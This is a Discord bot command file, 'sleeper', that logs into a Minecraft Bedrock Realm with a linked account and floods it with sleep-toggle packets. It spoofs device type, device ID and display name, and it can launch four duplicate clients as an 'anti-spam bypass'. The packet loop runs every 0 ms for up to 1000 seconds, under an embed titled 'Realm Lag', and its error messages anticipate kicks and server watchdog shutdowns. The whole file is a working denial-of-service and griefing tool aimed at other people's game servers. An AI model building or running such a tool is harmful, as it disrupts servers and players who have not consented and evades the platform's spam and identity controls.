const { SlashCommandBuilder, EmbedBuilder } = require("discord.js");
const config = require('../../data/discord/config.json');
const fs = require('node:fs').promises;
const colors = require('../../data/handles/colors.js');
const path = require('path');
const { createClient } = require('bedrock-protocol');
const { dumprealm, checkaccount, getrealminfo } = require('../../men/realms');
const { NIL, v3: uuidv3, v4: uuidv4 } = require('uuid');
const { Authflow, Titles } = require("prismarine-auth");
const skinData = require('../../data/skins/jenny.json');
const { reply1, reply2 } = require('../../data/discord/emojies.js');

// Status constants for the embed
const STATUS_OFF = "⚫";
const STATUS_WAITING = "🟡";
const STATUS_DONE = "🟢";
const STATUS_ERROR = "🔴";

// Helper: Update embed status fields
async function updateEmbed(interaction, embed, { connected, lagging, disconnected, reason }) {
  embed.setFields(
    { name: 'Connected', value: connected, inline: false },
    { name: 'Lagging', value: lagging, inline: false },
    { name: 'Disconnected', value: disconnected, inline: false },
    { name: 'Disconnected Reason', value: reason, inline: false },
  );
  await interaction.editReply({ embeds: [embed] });
}

// Helper: Cleanly disconnect a client (only once)
function disconnectClient(client) {
  if (client && typeof client.disconnect === "function") {
    client.disconnect();
  }
}

// Helper: Send sleep packets
function sendSleepPackets(client, actionPacket) {
  // Toggle sleep state with a pair of start/stop messages
  client.write('player_action', { ...actionPacket, action: 'start_sleeping' });
  client.write('player_action', { ...actionPacket, action: 'stop_sleeping' });
}

module.exports = {
  data: new SlashCommandBuilder()
    .setName("sleeper")
    .setIntegrationTypes(0, 1)
    .setContexts(0, 1, 2)
    .setDescription("Sleep on the Server")
    .addStringOption(option =>
      option.setName('invite')
        .setDescription('Realm invite code or Realm ID')
        .setRequired(true)
        .setMinLength(8)
        .setMaxLength(15))
    .addIntegerOption(option =>
      option.setName('device')
        .setDescription('What Device Spoof')
        .setRequired(true)
        .addChoices(
          { name: 'Silly Cat +', value: 69696 },
          { name: 'Silly Cat -', value: -69696 },
          { name: 'Samsung Fridge', value: 16 },
          { name: 'Samsung Washmaschine', value: 17 },
          { name: 'Guh', value: 18 },
          { name: 'Unknowen', value: 0 },
          { name: 'Android', value: 1 },
          { name: 'IOS', value: 2 },
          { name: 'OSX', value: 3 },
          { name: 'FireOS', value: 4 },
          { name: 'GearVR', value: 5 },
          { name: 'Hololens', value: 6 },
          { name: 'Windows 10 (x64)', value: 7 },
          { name: 'Windows 10(x86)', value: 8 },
          { name: 'Dedicated Server', value: 9 },
          { name: 'TvOS (Appel TV)', value: 10 },
          { name: 'Playstation', value: 11 },
          { name: 'Nitendo Switch', value: 12 },
          { name: 'XBOX', value: 13 },
          { name: 'Phone (windows)', value: 14 },
          { name: 'Linux', value: 15 },
        ))
    .addIntegerOption(option =>
      option.setName('duration')
        .setDescription('Duration in seconds to send packets')
        .setRequired(true)
        .setMinValue(10)
        .setMaxValue(1000))
    .addBooleanOption(option =>
      option.setName('dupe_client')
        .setDescription('Anti-spam bypass option')
        .setRequired(false))
    .addStringOption(option =>
      option.setName('namespoof')
        .setDescription('Clients Name')
        .setRequired(false)
        .setMinLength(8)
        .setMaxLength(50)),
  async execute(interaction) {
    const invite = interaction.options.getString('invite');
    const duration = interaction.options.getInteger('duration');
    const device = interaction.options.getInteger('device');
    const namespoof = interaction.options.getString('namespoof');
    const dupe_client = interaction.options.getBoolean('dupe_client') || false;
    let disconnected = false;

    // Create initial embed
    const mainEmbed = new EmbedBuilder()
      .setTitle("Realm Lag")
      .setDescription("Loading data, this may take a few seconds depending on the workload.")
      .setColor(config.embeds.color);

    // Initial status update
    await updateEmbed(interaction, mainEmbed, {
      connected: STATUS_OFF,
      lagging: STATUS_OFF,
      disconnected: STATUS_OFF,
      reason: STATUS_WAITING
    });

    // Load user database
    const databasePath = './data/user/users.json';
    let database;
    try {
      database = JSON.parse(await fs.readFile(databasePath, 'utf8'));
    } catch (error) {
      return interaction.editReply({
        content: 'Failed to load the database.',
        ephemeral: true,
      });
    }

    // Check if account is linked
    if (!(await fs.stat(`./data/user/profilefolders/${interaction.user.id}`).catch(() => false))) {
      await interaction.editReply({
        embeds: [
          new EmbedBuilder()
            .setTitle('Account Not Linked')
            .setDescription('It seems like you haven\'t linked an account yet.\nPlease link an account with `/link` to use this command.')
            .setColor(0xff0000),
        ],
      });
      return;
    }

    // Check whitelist
    const whitelist = JSON.parse(await fs.readFile('./data/util/whitelist.json', 'utf8'));
    if (whitelist.includes(invite)) {
      return interaction.editReply({
        embeds: [
          new EmbedBuilder()
            .setTitle('Realm Error')
            .setDescription(`The invite ${invite} is in the whitelist and cannot be lagged.`)
            .setColor(config.embeds.color)
        ]
      });
    }

    // Get realm info
    const realm = await getrealminfo(invite);
    if (!realm) {
      console.error(`[${new Date().toLocaleTimeString()}] Error: Realm not found`);
      return interaction.editReply({
        embeds: [
          new EmbedBuilder()
            .setTitle('Realm Error')
            .setDescription('Invalid code: realm not found or account banned.')
            .setColor(config.embeds.color)
        ]
      });
    }

    // Create one or more client instances
    if (dupe_client) {
      for (let i = 1; i <= 4; i++) {
        createClientInstance(interaction, invite, realm, mainEmbed, skinData, namespoof, device, duration);
      }
    } else {
      createClientInstance(interaction, invite, realm, mainEmbed, skinData, namespoof, device, duration);
    }
  },
};

async function createClientInstance(interaction, invite, realm, mainEmbed, skinData, namespoof, device, duration) {
  let packetInterval;
  const client = createClient({
    profilesFolder: `./data/user/profilefolders/${interaction.user.id}`,
    username: interaction.user.id,
    offline: false,
    realms: {
      ...(invite.length === 8 ? { realmId: invite } : { realmInvite: invite })
    },
    skinData: {
      DeviceOS: device,
      DeviceId: getDeviceId(device),
      PlatformOnlineId: genrandomstring(19, '1234567890'),
      PrimaryUser: false,
      SelfSignedId: uuidv4(),
      ThirdPartyName: namespoof,
      ThirdPartyNameOnly: true,
      TrustedSkin: true,
      ...skinData
    },
    skipPing: true
  });

  client.on('server_stats', async (err) => {
    console.error(`${colors.blue}[${new Date().toLocaleTimeString()}]${colors.yellow} Buggy Packet Received: ${err.message || err}`);
  });

  client.on('error', async (err) => {
    console.error(`${colors.blue}[${new Date().toLocaleTimeString()}] ${colors.yellow} Client error: ${err.message || err}`);
    mainEmbed.setDescription("Wops! There was an error while trying to join the Realm");
    await updateEmbed(interaction, mainEmbed, {
      connected: STATUS_OFF,
      lagging: STATUS_ERROR,
      disconnected: STATUS_ERROR,
      reason: `${err}`
    });
    disconnectClient(client);
  });

  client.on('start_game', async (packet) => {
    console.log(`${colors.green}[Realm Watcher]>> User ${interaction.user.username}/${interaction.user.id} joined Realm ${realm.name}/${invite}`);
    try {
      mainEmbed.setDescription(`${reply1}Realm Name: ${realm.name}\n${reply1}Realm ID: ${realm.id}\n${reply2}Realm IP: ${realm.ip}`);
      await updateEmbed(interaction, mainEmbed, {
        connected: STATUS_DONE,
        lagging: STATUS_WAITING,
        disconnected: STATUS_WAITING,
        reason: STATUS_WAITING
      });

      const actionPacket = {
        runtime_entity_id: packet.runtime_entity_id,
        position: { x: 0, y: 0, z: 0 },
        result_position: { x: 0, y: 0, z: 0 },
        face: 0,
      };

      // Start sending sleep packets at intervals
      packetInterval = setInterval(() => {
        sendSleepPackets(client, actionPacket);
      }, 0);

      // End the loop after the duration expires
      setTimeout(async () => {
        if (!client._disconnected) {
          clearInterval(packetInterval);
          disconnectClient(client);
          await updateEmbed(interaction, mainEmbed, {
            connected: STATUS_DONE,
            lagging: STATUS_DONE,
            disconnected: STATUS_DONE,
            reason: STATUS_WAITING
          });
        }
      }, duration * 1000);
    } catch (error) {
      console.error(error);
      disconnectClient(client);
    }
  });

  // Map error messages to friendly strings
  const errorMap = {
    "disconnectionScreen.noReason": "You have been disconnected from the Realm because of sending too many packets",
    "disconnection.kicked.reason": "You have been Kicked From the Realm",
    "disconnection.kicked": "You have been Kicked From the Realm",
    "disconnectionScreen.outdatedClient": "The Realm is outdated!",
    "disconnectionScreen.disconnected": "Disconnected from the Realm",
    "disconnectionScreen.serverFull": "Realm is Currently Full",
    "disconnectionScreen.notAllowed": "Something didn't go right, try to use a shorter NameSpoof. (notAllowed)",
    "disconnectionScreen.serverIdConflict": "Client already in this Realm. Leave with the Account or wait until your interaction is done",
    "disconnectionScreen.loggedinOtherLocation": "Client already in this Realm. Leave with the Account or wait until your interaction is done",
    "disconnectionScreen.worldCorruption": "The world on this realm is corrupted, unable to join",
    "disconnect.scriptWatchdog": "The realm was shut down due to an unhandled scripting watchdog exception.",
    "disconnect.scriptWatchdogOutOfMemory": "The realm was shut down because of scripting memory limit."
  };

  function parseKickMessage(error) {
    for (const key in errorMap) {
      error = error.replace(key, errorMap[key]);
    }
    return error;
  }

  client.on('kick', async (reason) => {
    console.log(`${colors.blue}[${new Date().toLocaleTimeString()}] ${colors.red}Client Kicked from the Realm. ${realm.id}/${realm.name}. ${parseKickMessage(reason.message)}`);
    await updateEmbed(interaction, mainEmbed, {
      connected: STATUS_OFF,
      lagging: STATUS_ERROR,
      disconnected: STATUS_ERROR,
      reason: parseKickMessage(reason.message)
    });
  });

  client.on('close', async (err) => {
    if (!err || client._disconnected) return;
    console.log(`${colors.blue}[${new Date().toLocaleTimeString()}]${colors.red} Client closed connection from the Realm. ${realm.id}/${realm.name}.`);
    await updateEmbed(interaction, mainEmbed, {
      connected: STATUS_OFF,
      lagging: STATUS_ERROR,
      disconnected: STATUS_ERROR,
      reason: parseKickMessage(err.message || "N/A")
    });
  });
}

function genrandomstring(length, charSet) {
  if (!charSet) charSet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890_-';
  let result = '';
  for (let i = 0; i < length; i++) {
    result += charSet.charAt(Math.floor(Math.random() * charSet.length));
  }
  return result;
}

function getDeviceId(deviceOS) {
  const getUUIDv3 = () => uuidv3(uuidv4(), NIL);
  // Note: uuidv5 is not imported in this version, so for Nintendo Switch fallback we use v4.
  switch (deviceOS) {
    // Android
    case 1:
      return uuidv4().replace(/-/g, "");
    // iOS
    case 2:
      return uuidv4().replace(/-/g, "").toUpperCase();
    // Windows (x86) and (x64)
    case 7:
    case 8:
      return getUUIDv3();
    // Playstation
    case 11:
      return getUUIDv3();
    // Nintendo Switch (using v4 as fallback)
    case 12:
      return uuidv4();
    // Xbox: custom random string
    case 13:
      return genrandomstring(44, "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890/=+");
    default:
      return uuidv4();
  }
}
